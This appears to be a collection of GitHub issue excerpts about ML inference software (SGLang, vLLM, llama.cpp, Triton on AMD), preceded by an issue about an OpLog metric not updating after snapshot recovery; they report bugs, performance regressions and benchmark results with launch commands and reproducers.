`OpLogApplier::Recover(last_applied_sequence_id)` updates only `expected_sequence_id` to `last_applied_sequence_id + 1`. It does not update the HA applied-sequence gauge.

The gauge is currently updated when an individual `ApplyOpLogEntry` succeeds. The snapshot bootstrap path installs the recovered baseline through `HotStandbyService::LoadBatchOpLogSnapshotBaselineLocked` and updates the standby's internal `applied_seq_id_`, but does not update `ha_oplog_applied_sequence_id`. Therefore, a snapshot with an empty incremental tail leaves the exported gauge at its initial value.

### Impact

- Monitoring reports an incorrect applied sequence immediately after snapshot recovery.
- Any alert, readiness check, or recovery validation based on `ha_oplog_applied_sequence_id` or derived lag can report a false failure or an incorrect recovery state.
- Operators cannot distinguish a metric reporting error from an actual OpLog replay failure using the exported metrics alone.

This is an observability and recovery-validation defect. The current evidence does not indicate data loss or incorrect recovered object metadata; the internal recovery cursor is correct.

### Expected behavior

After a successful snapshot recovery, `ha_oplog_applied_sequence_id` must equal the latest sequence represented by the recovered baseline, even when no incremental OpLog entries follow it:

```text
snapshot_applied_sequence = 117
ha_oplog_applied_sequence_id = 117
expected_sequence_id = 118
```

When incremental entries are subsequently applied, the metric must continue advancing to the latest successfully applied sequence.

### Scope of the fix

Synchronize the applied-sequence gauge with the recovered baseline during snapshot/bootstrap installation. Check all recovery paths that establish a baseline, including batch snapshot recovery, ordinary snapshot recovery, and local warm restart, so that the metric does not depend on at least one later OpLog entry being replayed.

Do not change the recovered cursor or treat the metric as the source of truth; the metric should reflect the already recovered cursor.

### Acceptance criteria

Add regression coverage for:

1. Snapshot recovery with no incremental OpLog tail.
2. Snapshot recovery followed by incremental entries.
3. A baseline at sequence `0`.
4. Consistency between the applied sequence, expected sequence, snapshot batch, and lag metrics.

The tests should verify both the internal synchronization status and the exported `ha_oplog_applied_sequence_id` metric.

### Additional context

The metric is defined as the "Latest OpLog sequence ID applied by Standby". A successful snapshot recovery already reports the recovered sequence in recovery logs and synchronization status, so the exported metric should expose the same value rather than remain at its process-start default.

items.title: GLM-5.3-Flash on 8x B200: dual TP4/EP4 serving profile with long-context measurements
items.author: stewtong
items.body_excerpt:
<!-- register: GitHub Discussion | reader: SGLang maintainers and operators | consumed: repository thread -->

I measured an SGLang serving profile for `zai-org/GLM-5.3-Flash` on one 8x NVIDIA B200 node. It uses two independent TP4/EP4 replicas, FP8 KV cache, TRT-LLM DSA backends, the FlashInfer TRT-LLM MoE runner, static NEXTN 5-1-6, and session-affine routing.

**Update, September 27:** on the pinned image, one server prefilling two 1M-token prompts together ran out of GPU memory in the sparse-attention indexer. [#40854](https://github.com/sgl-project/sglang/pull/40854) fixes this upstream, and the repository now publishes an equivalent local patch. The results below predate the patch. The September run's findings are in [this comment](https://github.com/sgl-project/sglang/discussions/37153#discussioncomment-18627772).

The pinned software stack, engine commands, proxy configuration, client setup, methods, and results are documented here: https://github.com/stewtong/b200-glm53

Validation observations:

- All 138 streaming Chat Completions requests returned HTTP 200 with the requested completion length. None timed out or returned HTTP 429.
- At concurrency 1, median end-to-end output rate including prefill was 245.3 tok/s at about 131K input tokens and 12.50 tok/s at about 1M input tokens.
- At about 524K input tokens and total concurrency 16 across both replicas, 48/48 requests completed without an observed out-of-memory error. Maximum capacity remains unmeasured.
- GSM8K scored 1,284/1,319 (97.35%) with the checkpoint's default max effort and 1,272/1,319 (96.44%) with `reasoning_effort: low`. The conditions used different output limits and are reported separately in the repository.
- In a repeated-prefix cache study with stable session affinity, median time to first output event was 3.10 seconds on turn 1 and 0.62 seconds on later turns. With a changed leading system line, the corresponding medians were 3.13 and 3.24 seconds.

The serving table and cache study used three repetitions per condition. Since September 3, the repository also publishes the benchmark harness and the request-level rows for both. The repository documents the tested boundaries and excludes unsupported aggregate throughput, decode TPOT, route-latency, and causal claims.

items.title: [Bug] DeepSeek-V4-Pro decode ~5% slower at concurrency 1 on GB300 after #39704
items.author: nv-fszarwacki
items.body_excerpt:
### Checklist
- [x] I searched related issues but found no solution.
- [x] The bug persists in a recent version (nightly build of `cae69be58`, see below).
- [x] Environment info is included below.

### Describe the bug
DeepSeek-V4-Pro decode throughput on 2 x 4 GB300 (SM103) dropped about 5% at concurrency 1 after [#39704](https://github.com/sgl-project/sglang/pull/39704) ("[DSV4.1] Reduce mHC, metadata and small-batch router overhead", commit `7fac84b63`). The PR aims to lower small-batch overhead, but here it lowers output token throughput.

Measured with `aiperf`, concurrency 1, ISL 1000 / OSL 1000, TP 8 over 2 nodes, FP8 KV cache. Same build comparison, only the SGLang commit differs:

| MoE weights | Parent of #39704 | With #39704 | Change |
| --- | ---: | ---: | ---: |
| FP8 + MXFP4 | 112.48 tok/s | 107.39 tok/s | -4.5% |
| FP8 + NVFP4 | 115.08 tok/s | 109.21 tok/s | -5.1% |

Control runs on the same builds agree (MXFP4: 112.59 vs 106.58 tok/s).

The regression is still present on a later nightly build, `cae69be58` (597 commits after `7fac84b63`, so it contains #39704):

| MoE weights | Throughput at `cae69be58` | Parent of #39704 (`d1acbe074`) |
| --- | ---: | ---: |
| FP8 + MXFP4 | 106.47 tok/s | 112.48 tok/s |
| FP8 + NVFP4 | 106.95 tok/s | 115.08 tok/s |

I did not test the current `main` head. It is 123 commits after `cae69be58`, and I saw no DeepSeek-V4 performance fix for NVIDIA GPUs in that range.

What is proven:
- A three-round source bisect first found the regression between nightly builds `20518d851` (good) and `582389cec` (bad). 230 commits separate them.
- The bisect then identified #39704 as the first bad commit.
- A build with the parent of #39704 (`d1acbe074`) keeps full speed. A build with `7fac84b63` reproduces the drop. Both weight formats behave the same way.

What is not proven:
- The cause inside the PR. It changes the mHC post-combine path, the small-batch router path, and the MXFP4 MoE path. I did not isolate which part is slow.
- The two nightly builds also differ in Python packages (for example `xgrammar` 0.2.1 vs 0.2.7). The commit-level bisect used a fixed environment, so these packages are not the cause.

### Reproduction
Use two nodes with 4 GB300 each. Run the server on both nodes (`--node-rank 0` and `--node-rank 1`):

```bash
SGLANG_RADIX_FORCE_MISS=1 python3 -m sglang.launch_server \
  --model-path deepseek-ai/DeepSeek-V4-Pro \
  --served-model-name deepseek-v4-pro-861b \
  --tp 8 --nnodes 2 --node-rank 0 --dist-init-addr <node0>:<port> \

  --enable-nccl-nvls --enable-symm-mem --enable-metrics \
  --trust-remote-code --host 0.0.0.0 --port 20621
```

The server resolves `attention_backend=dsv4` and `moe_runner_backend=flashinfer_mxfp4` for the FP8 + MXFP4 case.

Then run the client on node 0:

```bash
aiperf profile --url localhost:20621 --model deepseek-v4-pro-861b \
  --tokenizer deepseek-ai/DeepSeek-V4-Pro --tokenizer-trust-remote-code \
  --endpoint-type completions --streaming \
  --extra-inputs min_tokens:1000 --extra-inputs max_tokens:1000 --extra-inputs ignore_eos:true \

items.title: TritonAMDGPUBlockPingpong produces invalid TTGIR with tl.dot, dynamic loop, and runtime-selected pointer
items.author: O1iveira7
items.body_excerpt:
### Describe the bug

 A Triton matmul-style kernel fails to compile on the AMD/HIP backend during
  `make_ttgir`. The failure is triggered by a dynamic `tl.range` loop containing a
  runtime `if` that selects one of two B-matrix pointer expressions before a masked
  `tl.load`, followed by `tl.dot`.

  The failure occurs with `num_stages=2` and reports a dominance verifier error
  while executing `TritonAMDGPUBlockPingpong`:

  ```text
Traceback (most recent call last):

  File "/usr/local/lib/python3.12/dist-packages/triton/runtime/jit.py", line 370, in <lambda>
    return lambda *args, **kwargs: self.run(grid=grid, warmup=False, *args, **kwargs)
                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/runtime/jit.py", line 739, in run
  
    kernel = self._do_compile(key, signature, device, constexprs, options, attrs, warmup)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/runtime/jit.py", line 884, in _do_compile
    kernel = self.compile(src, target=target, options=options.__dict__)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/compiler/compiler.py", line 327, in compile
    next_module = compile_ir(module, metadata)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/backends/amd/compiler.py", line 508, in <lambda>
    stages["ttgir"] = lambda src, metadata: self.make_ttgir(src, metadata, options)
                                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/backends/amd/compiler.py", line 273, in make_ttgir
    pm.run(mod, 'make_ttgir')
RuntimeError: PassManager::run failed

PassManager::run failed
```
  The same reduced reproducer compiles successfully with num_stages=1, which
  suggests the issue is specific to the AMD block-pingpong/pipelining pass rather
  than frontend lowering or pointer canonicalization.
### Reprocuder
Run this on an AMD machine.
```
import torch
import triton
import triton.language as tl


@triton.jit
def repro_dot_dominance(
    switch_ptr,
    a,
    b,
    c,
    M,
    N,
    K,
    stride_am,
    stride_bn,
    BLOCK_M: tl.constexpr,
    BLOCK_N: tl.constexpr,
    BLOCK_K: tl.constexpr,
):
    values = tl.load(switch_ptr + tl.arange(0, 2))
    zero, one = tl.split(values)
    cond = zero > one
    m_offsets = tl.arange(0, BLOCK_M)
    k_offsets = tl.arange(0, BLOCK_K)
    acc = tl.zeros((BLOCK_M, BLOCK_K), tl.float32)

    for n in tl.range(tl.cdiv(N, BLOCK_N)):
        n_offsets = n * BLOCK_N + tl.arange(0, BLOCK_N)
        a_mask = (m_offsets[:, None] < M) & (n_offsets[None, :] < N)
        a_ptrs = a + m_offsets[:, None] * stride_am + n_offsets[None, :]
        a_block = tl.load(a_ptrs, mask=a_mask, other=0.0)

        b_mask = (n_offsets[:, None] < N) & (k_offsets[None, :] < K)
        if cond:
            b_ptrs = b + n_offsets[:, None] * stride_bn + (one * k_offsets)[None, :]
        else:
            b_ptrs = b + n_offsets[:, None] * stride_bn + k_offsets[None, :]
        b_block = tl.load(b_ptrs, mask=b_mask, other=0.0)

        acc = tl.dot(a_block, b_block, acc, allow_tf32=False)

    c_mask = (m_offsets[:, None] < M) & (k_offsets[None, :] < K)
    c_ptrs = c + m_offsets[:, None] * K + k_offsets[None, :]
    tl.store(c_ptrs, acc, mask=c_mask)


def solve(a, b, c, M: int, N: int, K: int):
    switch = torch.tensor([0, 1], dtype=torch.int32, device=a.device)
    grid = (1, 1)
    repro_dot_dominance[grid](
        switch, a, b, c, M, N, K, N, K, 32, 32, 32, num_stages=2
    )
```

### Environment details

- Triton: 3.7.1
- AMD Instinct MI308X

items.title: [Bug]: Speculative decoding (mtp and dflash) silently disables prefix-cache hits for hybrid GDN models on nightly; worked on v0.24.0
items.author: cgoudie
items.body_excerpt:
(analysis by Fable 5)
### Your current environment

- DGX Spark (GB10, `sm_121`/`sm_121a`, aarch64, 128 GB unified memory), Docker `--network host --gpus all --ipc host`
- Image: `vllm/vllm-openai:nightly` → reports `v0.28.1rc1.dev43+g6f7df92a8`
- Comparison baseline on the same host: `vllm/vllm-openai:v0.24.0`
- Model: `unsloth/Qwen3.8-27B-NVFP4` (hybrid GDN: 48 linear-attention + 16 full-attention layers, built-in MTP head). Also reproduced with `RadixArk/Qwen3.8-27B-NVFP4` + `incoai/Qwen3.8-27B-DFlash2` (rev `dedf8df`).
- `--kv-cache-dtype fp8`, `--max-model-len 65536`, `--gpu-memory-utilization 0.30`, env `CUTE_DSL_ARCH=sm_121a`

### 🐛 Describe the bug

On the current nightly, enabling **any** speculative decoding method (built-in `mtp` or `dflash`) on a hybrid GDN model silently drops `vllm:prefix_cache_hits_total` to **0** — align-mode prefix caching engages at startup (log: `Mamba cache mode is set to 'align' for Qwen3_5ForConditionalGeneration`) but never hits, and repeated long prompts pay full re-prefill. The identical command minus `--speculative-config` hits normally. No crash, no warning — the caching is just inert, so this is easy to miss in production.

A/B on the same host, same model, same 18,219-token prompt sent twice (`max_tokens=10`):

| nightly config | TTFT req1 → req2 | `prefix_cache_hits_total` delta |
|---|---|---|
| APC only (no spec) | 9.46 s → **0.64 s** | **17,248** |
| APC + `{"method":"mtp","num_speculative_tokens":3}` | 23.6 s → 13.9 s* | **0** |
| APC + `{"method":"dflash", ..., "num_speculative_tokens":7}` | 12.9 s → 12.5 s | **0** |

\* the MTP row also shows a large decode regression on this platform (10.5 tok/s vs 19.7 on v0.24.0 with the same flags — possibly a separate sm_121 issue; noting it for context, not the subject of this report).

**On `v0.24.0`, MTP + align-mode APC coexist correctly** on the same host/model: repeated 9,901-token prompt → 8,000 tokens hit, TTFT 7.27 s → 1.33 s, with `mtp` k=3 active. So spec+APC coexistence for hybrids existed and regressed somewhere between v0.24.0 and the current nightly.

Repro (nightly):

```bash
docker run --rm --init --network host --gpus all --ipc host \
  -v /opt/models:/models -e CUTE_DSL_ARCH=sm_121a \
  vllm/vllm-openai:nightly /models/qwen3.8-27b-nvfp4 \
  --served-model-name bench --port 10099 \
  --max-model-len 65536 --gpu-memory-utilization 0.30 \
  --max-num-seqs 1 --kv-cache-dtype fp8 \
  --enable-prefix-caching \
  --speculative-config '{"method":"mtp","num_speculative_tokens":3}'
# send any >3,300-token prompt twice; watch vllm:prefix_cache_hits_total stay 0
# drop --speculative-config and the second send hits ~all full blocks
```

Possibly related but distinct: #53670 (hits occur but recompute per hit), #41884 (DFlash+APC IndexError crash — we see silent zero-hit, not a crash), #26201 (tracking).

Is the suppression intentional (spec-decode + hybrid APC support not yet wired on the new path), or a regression? If intentional, a startup warning like the align-mode one would save users from silently losing their cache. Happy to run further diagnostics on this hardware.

items.title: [Performance]: Nemotron-3.5-Lightning NVFP4 decode ~16% slower on DGX Spark (GB10/SM121) since v0.29.0
items.author: saveriospeziali
items.body_excerpt:
### Report of performance regression

Single-request decode of `nvidia/NVIDIA-Nemotron-3.5-Lightning-30B-A3B-NVFP4` on DGX Spark (GB10, SM121) is **~16% slower from v0.29.0 onward** without speculative decoding, and ~8% slower with DSpark. v0.30.0 and current nightly do not recover it.

Same host, same command line, same weights, official images run back to back; only the image tag changes.

**Without speculative decoding** (decode tok/s, 1 request, 512 generated tokens, median of 5):

| image | greedy | temp 0.6 |
|---|---|---|
| v0.28.0 | **67.9** (67.7–68.0) | 67.1 |
| v0.29.0 | **57.2** (57.1–57.5) | 56.9 |

**With DSpark** (`num_speculative_tokens=3`), greedy, median of 5:

| image | decode tok/s | draft acceptance |
|---|---|---|
| v0.26.1rc1.dev994+gd626108b1 | 102.7 | 56% |
| v0.27.1 | 98.1 | 52% |
| v0.28.0 | **100.7** | 56% |
| v0.29.0 | **92.8** | 54% |
| v0.30.0 | 93.2 | 57% |
| v0.30.1rc1.dev558+g0cbac6cd1 (nightly) | 95.1 | 58% |

Draft acceptance is unchanged, so the drafter is not the cause; the per-step cost of the target went up.

**What I ruled out**

- **Model Runner V2**: v0.28.0 with `VLLM_USE_V2_MODEL_RUNNER=1` gives 101.0 tok/s (DSpark, greedy), the same as default v0.28.0. (V1 cannot be tested on v0.29+: "Model Runner V1 does not support: dspark speculative decoding".)
- **Mamba SSU backend**: with `--mamba-backend=triton` instead of `flashinfer` the gap remains (DSpark, greedy: v0.28.0 102.7 → v0.29.0 95.2).
- **CUDA graphs**: both versions capture the same graphs (35 PIECEWISE, 17 FULL, 17 dspark FULL).
- **torch / CUDA / triton**: identical in both images (torch 2.13.0+cu130, CUDA 13.0, triton 3.7.1).

What does differ between the two images: FlashInfer 0.6.16.post3 → 0.6.18 (#54313), fastsafetensors 0.3.3 → 0.4.0, and vLLM itself. Both versions select the same kernels in the log: `MARLIN` NvFp4 MoE backend, `MarlinNvFp4LinearKernel`, `FlashInferFP8ScaledMMLinearKernel`, `FLASH_ATTN` for the target. Possibly related, not verified: #54048 (cuBLAS out_dtype router GEMM on all archs including GB10) and #54427 (weight-only NVFP4 routed through W4A16), both in v0.29.0. #58624 is a different SM12x decode regression (DeepGEMM MoE); this model uses Marlin for the MoE.

### Command (without speculative decoding)

```bash
docker run --gpus all --shm-size 8g -p 8803:8000 \
  -v $HF_CACHE:/root/.cache/huggingface vllm/vllm-openai:v0.29.0 \
  --model=nvidia/NVIDIA-Nemotron-3.5-Lightning-30B-A3B-NVFP4 \
  --served-model-name=Nemotron-3.5-Lightning-30B \
  --tensor-parallel-size=1 --trust-remote-code \
  --gpu-memory-utilization=0.7 --max-model-len=262144 \
  --max-num-seqs=32 --max-num-batched-tokens=8192 \
  --kv-cache-dtype=bfloat16 --moe-backend=marlin \
  --mamba-backend=flashinfer --mamba-cache-mode=align \
  --enable-chunked-prefill --enable-prefix-caching \
  --load-format=fastsafetensors \
  --override-generation-config='{"temperature":0.6,"top_p":0.8,"top_k":20}' \
  --reasoning-parser=nemotron_v3 --tool-call-parser=qwen3_coder --enable-auto-tool-choice
```

For the DSpark numbers, add:
`--speculative-config='{"model":"nvidia/NVIDIA-Nemotron-3.5-Lightning-30B-A3B-NVFP4-DSpark","num_speculative_tokens":3}'`

### Measurement

Streaming `/v1/chat/completions`, `max_tokens=512`, a fresh UUID at the start of each prompt (no prefix-cache hits), one warmup request discarded. Decode rate = (completion_tokens − 1) / (time of last delta − time of first delta), counting both `content` and `reasoning` deltas. Draft acceptance from the `vllm:spec_decode_num_accepted_tokens_total` / `vllm:spec_decode_num_draft_tokens_total` deltas on `/metrics`.

### Environment

- NVIDIA DGX Spark, GB10 (SM121), 128 GB unified memory, driver 580.178.04
- Ubuntu 24.04.5, kernel 7.0.0-1019-nvidia, Docker 29.6.2
- `vllm/vllm-openai:v0.28.0` (`sha256:61fc8a896b0a…`) vs `vllm/vllm-openai:v0.29.0` (`sha256:c29147676055…`), linux/arm64

items.title: [Bug]: `vllm preload` daemon never matches a dense (non-MoE) engine with `--data-parallel-size > 1` (WeightCacheKey `dp_size` mismatch)
items.author: nien-hui
items.body_excerpt:
### Your current environment
The output of python collect_env.py ```text OS : Ubuntu 22.04.3 LTS (x86_64) Python : 3.12.14 PyTorch : 2.13.0+cu130 (CUDA 13.0) transformers : 5.17.0 GPUs : 2x NVIDIA RTX A6000 Nvidia driver : 580.178.04 vLLM : main at 5f30fc7031 (2026-10-03), built from source ```
### 🐛 Describe the bug With a dense (non-MoE) model and `--data-parallel-size N` (N > 1), engines started with `--load-format ipc_cache` never use the daemon started by `vllm preload` with the same flags. The daemon fingerprints each rank with `dp_size=N, dp_rank=r`, but a dense engine fingerprints every rank with `dp_size=1, dp_rank=0`, so the `WeightCacheKey` check fails on every rank. - With the default `fallback=true`, each rank logs one warning and loads from disk. The server works, but Fast Start does nothing, and the daemon keeps holding its own copy of the weights on every GPU. - With `"fallback": false`, the engine fails to start. The preload docs list data parallelism as supported ([`docs/features/preload.md` L26-L28](https://github.com/vllm-project/vllm/blob/5f30fc7031cae49bf51073fc953d419b08f8887c/docs/features/preload.md#L26-L28), [L167](https://github.com/vllm-project/vllm/blob/5f30fc7031cae49bf51073fc953d419b08f8887c/docs/features/preload.md#L167)) and do not restrict it to MoE models. #### Reproduction Two GPUs, public dense model. ```bash # Terminal 1 vllm preload --model Qwen/Qwen3-0.6B --data-parallel-size 2 ``` Wait for `Weight cache daemon READY`, then: ```bash # Terminal 2 vllm serve Qwen/Qwen3-0.6B --data-parallel-size 2 --load-format ipc_cache \ --enforce-eager --gpu-memory-utilization 0.2 --max-model-len 2048 ``` `--enforce-eager`, `--gpu-memory-utilization 0.2` and `--max-model-len 2048` only keep the run small because the GPUs on my machine are shared. #### Results With the default `fallback=true`, the server starts and answers, but no rank logs `Mapped ... tensors from the weight cache daemon`. Instead: ```text (Worker pid=2698932) WARNING [ipc_loader.py:217] Weight cache unusable (WeightCacheKey mismatch on fields: ['dp_size']); falling back to disk loading (Worker pid=2698929) WARNING [ipc_loader.py:217] Weight cache unusable (WeightCacheKey mismatch on fields: ['dp_size', 'dp_rank']); falling back to disk loading ``` The daemon logs the same two mismatches and keeps serving. With `--model-loader-extra-config '{"fallback": false}'` added to `vllm serve`, `EngineCore failed to start`. Rank 0 raises `CacheConfigMismatchError: WeightCacheKey mismatch on fields: ['dp_size']`, rank 1 the same with `['dp_size', 'dp_rank']`.
Traceback with fallback=false (rank 0) ```text Traceback (most recent call last): File "vllm/v1/executor/multiproc_executor.py", line 915, in worker_main worker = WorkerProc(*args, **kwargs) ^^^^^^^^^^^^^^^^^^^^^^^^^^^ File "vllm/tracing/otel.py", line 175, in sync_wrapper return func(*args, **kwargs) ^^^^^^^^^^^^^^^^^^^^^ File "vllm/v1/executor/multiproc_executor.py", line 682, in __init__ self.worker.load_model() File "vllm/v1/worker/gpu_worker.py", line 574, in load_model self.model_runner.load_model(load_dummy_weights=load_dummy_weights) File "vllm/v1/worker/gpu/model_runner.py", line 379, in load_model self.model = model_loader.load_model( ^^^^^^^^^^^^^^^^^^^^^^^^ File "vllm/tracing/otel.py", line 175, in sync_wrapper return func(*args, **kwargs) ^^^^^^^^^^^^^^^^^^^^^ File "vllm/model_executor/model_loader/weight_cache/ipc_loader.py", line 211, in load_model state = self._fetch_entries(model_config) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File "vllm/model_executor/model_loader/weight_cache/ipc_loader.py", line 359, in _fetch_entries return self._request_state_with_startup_wait(cache_config) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File "vllm/model_executor/model_loader/weight_cache/ipc_loader.py", line 365, in _request_state_with_startup_wait return self._with_startup_wait(lambda: self._request_state(cache_config)) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File "vllm/model_executor/model_loader/weight_cache/ipc_loader.py", line 373, in _with_startup_wait return op() ^^^^ File "vllm/model_executor/model_loader/weight_cache/ipc_loader.py", line 365, in return self._with_startup_wait(lambda: self._request_state(cache_config)) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File "vllm/model_executor/model_loader/weight_cache/ipc_loader.py", line 397, in _request_state raise CacheConfigMismatchError( vllm.model_executor.model_loader.weight_cache.protocol.CacheConfigMismatchError: WeightCacheKey mismatch on fields: ['dp_size'] ```
Two controls on the same machine: - The same commands without `--data-parallel-size` on one GPU: the engine logs `Mapped 339 tensors from the weight cache daemon (zero_copy mode)`. - One `vllm preload` **without** `--data-parallel-size` per GPU (`CUDA_VISIBLE_DEVICES=0` and `CUDA_VISIBLE_DEVICES=1`), then the same `vllm serve ... --data-parallel-size 2 --load-format ipc_cache` with `fallback=false`: both ranks map 339 tensors from the daemon on their GPU and the server answers normally. So the daemons' weights are usable; only the advertised key differs. (This also works as a workaround.) #### Cause 1. For a non-MoE model, the engine runs every DP rank as an independent DP=1 engine: `run_engine_core` calls `parallel_config.reconfigure_for_independent_dp_rank()` ([`core.py` L1388-L1397](https://github.com/vllm-project/vllm/blob/5f30fc7031cae49bf51073fc953d419b08f8887c/vllm/v1/engine/core.py#L1388-L1397)), which sets `data_parallel_size = 1` and `data_parallel_rank = 0` ([`parallel.py` L1158-L1167](https://github.co

items.title: Feature Request: Graceful reasoning budget termination. Avoid mid-sentence cutoff.
items.author: CleStil
items.body_excerpt:
### Prerequisites

- [x] I am running the latest code. Mention the version if possible as well.
- [x] I carefully followed the [README.md](https://github.com/ggml-org/llama.cpp/blob/master/README.md).
- [x] I searched using keywords relevant to my issue to make sure that I am creating a new issue that is not already open (or closed).
- [x] I reviewed the [Discussions](https://github.com/ggml-org/llama.cpp/discussions), and have a new and useful enhancement to share.

### Feature Description

PR #20297 (merged ~2025-03-11) added `--reasoning-budget-message`, which injects
a string at the hard token cutoff to signal the model to wrap up. The injection
still happens at exactly token N with zero warning. The model gets no time to
finish its current thought before the `</think>` boundary.

Graceful termination before the cutoff is expected to improve reasoning
performance. See Motivation and Possible Implementation for details.


### Motivation

Raw truncation of the thinking trace measurably reduces answer quality compared
to graceful termination. Muennighoff et al. (s1: Simple test-time scaling,
arXiv:2501.19393) showed that appending an end-of-thinking delimiter with
"Final Answer:" before the hard cut outperforms naïve truncation. This was
confirmed by follow-up work (arXiv:2505.05315), which states directly that
"the S1 approach performs better than directly truncating the full reasoning
trajectory, underscoring the importance of preserving the solution segment."

The current --reasoning-budget-message implementation injects a wrap-up message
at exactly token N, leaving the model zero tokens to actually act on it. This is
functionally equivalent to truncation with a cosmetic suffix — the model cannot
produce a meaningful conclusion within 0 remaining tokens.

### Possible Implementation

Three approaches in increasing complexity:

Option A — message offset
Inject the budget message at `budget - offset` instead of `budget`, giving the
model `offset` tokens to act on the wrap-up signal. The s1 paper
(https://arxiv.org/abs/2501.19393) shows this outperforms raw truncation.
Change in the COUNTING state of reasoning-budget.cpp:

    if (ctx->remaining <= ctx->warn_offset)  // was: <= 0

Files: reasoning-budget.cpp, reasoning-budget.h, common.h, arg.cpp,
sampling.cpp. Default 0 preserves current behavior.

Option B — separate budgeting
Split total budget into thinking (t) and conclusion (s) phases, t + s = budget.
Force `</think>` at token t, leave s tokens for a conclusion before the answer.
Follow-up work on s1 (https://arxiv.org/abs/2505.05315) shows this outperforms
the basic offset approach. Would add a second parameter, e.g.
--reasoning-budget-conclusion M.

Option C — logit biasing toward `</think>`
Ramp up the logit weight of `</think>` as the budget runs low, then force it at
the hard limit. No dependency on an injected phrase, model-agnostic. NVIDIA NIM
uses this approach with a 10% extension window for sentence completion. More
invasive (sampler changes) but cleanest long-term.

Options A and B build on the existing message injection architecture. Option C
is a parallel approach that could coexist with either.

Happy to test on ROCm/gfx1100 (Qwen3.5-27B) and contribute a draft of Option A
or B if there is interest.

items.title: Server wedge: generation stalls mid-decode; /health OK but /slots hangs; needs SIGKILL
items.author: victorarthur
items.body_excerpt:
# Server wedge: generation stalls mid-decode; /health OK but /slots hangs; process must be SIGKILLed

## Summary

Under long-running load the server occasionally **stops generating mid-decode**:
`print_timing` lines cease, GPU utilization drops to 0%, the process stays alive,
`/health` still returns `{"status":"ok"}`, but **`/slots` hangs** (no response)
and the client stream goes idle until the client-side timeout. In one instance
the process also **ignored SIGTERM** and required `kill -9`.

Observed **3 times in 2 days across two builds and two different models, with
and without MTP**, so it does not appear specific to a model, speculative
decoding, or a recent regression.

## Environment

- llama.cpp CUDA backend; observed on build 452 (`9558fa4`) and build 561 (`ee4c505`)
- 2× RTX 3090 (PCIe/PHB, no NVLink), driver 570.133.07, CUDA 12.8, Linux
- No `Xid` errors in `dmesg` in any incident (not a GPU fault)

## Incidents

**A)** Qwen3.6-35B-A3B Q8_0 (MoE, **no MTP**), single slot, 32K ctx, long-context
eval task: generation stopped after ~286 tokens (timing lines ceased), client
timed out after 20 min, server log showed `cancel task` then the process kept
spinning (`R` state), ignored SIGTERM, needed SIGKILL. Immediately before the
stall: `slot get_availabl: … selected slot by LCP similarity, f_sim_best = 0.999`.

**B)** Qwen3.8-27B Q6_K (embedded MTP, `--spec-type draft-mtp --spec-draft-n-max 3`),
`--parallel 2`, two concurrent agent workloads: slot 1 decoding normally
(~40 tok/s, `n_decoded = 8337`), then all timing output stops; `/health` OK,
`/slots` hangs, GPU 0%. Restart required. Full journal excerpt (926 lines around
the stall) available on request.

**C)** Same symptom pattern on build 561 during a client 300 s stream-idle
timeout; restart healed it.

## Server invocation (incident B)

```
llama-server -m Qwen3.8-27B-Q6_K.gguf -mm mmproj-F16.gguf \
  --spec-type draft-mtp --spec-draft-n-max 3 \
  --jinja -ngl 999 --ctx-size 458752 --parallel 2 \
  -ctk q8_0 -ctv q8_0 --cache-reuse 0 --no-context-shift \
  --temp 1.0 --top-p 0.95 --top-k 20 --min-p 0.0
```

(`--cache-reuse 0 --no-context-shift` were added after incident A as a hunch;
incident B shows they do not prevent it.)

## Notes

- `/health` responding while `/slots` hangs suggests the slots endpoint blocks on
  a mutex held by the stuck decode path — a liveness probe on `/slots` (or a
  watchdog around the decode loop) would at least make the state detectable.
- Happy to reproduce with added instrumentation and to share full journals.

items.title: qwen4exp (PR #27742): multi-segment prompts degrade to '//////' on gfx1151 — deterministic repro
items.author: ranxianglei
items.body_excerpt:
> Repro report for **PR #27742** — the PR discussion is locked (`too heated`), so filing here instead. Everything below is tested against that PR's head (`6c5afc86`) and also the #27774 head (`abdc7a0`).

## Multi-segment prompt regression on Strix Halo (gfx1151) — deterministic repro + a GPU-state gotcha

First of all, thanks for this PR — single-turn usage already works great here (thinking mode included, after the chat-template workaround below).

### Environment

- Strix Halo laptop APU: Ryzen AI MAX+ 395 + Radeon 8060S (`gfx1151`), ROCm 7.2, kernel 6.19.8
- Tested both #27774 head (`abdc7a0`) and #27742 head (`6c5afc86`)
- Model: `unsloth/Qwen3.8-Flash-Next-GGUF` `UD-Q4_K_XL` (111.3 GB)
- `llama-server -ngl auto -c 8192 --parallel 1 --jinja` with `LLAMA_ATTN_ROT_DISABLE=1` (required, otherwise output is broken as noted earlier in the thread)

### Bug: any prompt with ≥2 message segments degrades to `//////`

Single-segment prompts are **perfect** (long 900-token user turns, thinking mode, cache-hit reruns all fine). Add a second segment and the very first generated token is already `/`, then `/` forever. 100% deterministic, temperature-independent.

Minimal repro via `/completion` (temperature 0):

**CLEAN:**
```
<|im_start|>user
What is the capital of France?<|im_end|>
<|im_start|>assistant
```

**DEGEN — multi-turn:**
```
<|im_start|>user
My name is Bob.<|im_end|>
<|im_start|>assistant
Noted!<|im_end|>
<|im_start|>user
What is my name?<|im_end|>
<|im_start|>assistant
```

**DEGEN — plain text before the first `<|im_start|>` (so even "preamble + one segment" breaks):**
```
Previous conversation: user said hi, assistant replied hello.
<|im_start|>user
What is the capital of France?<|im_end|>
<|im_start|>assistant
```

Also degenerate: standalone `system` message + user; `user`+`user`+`user`.

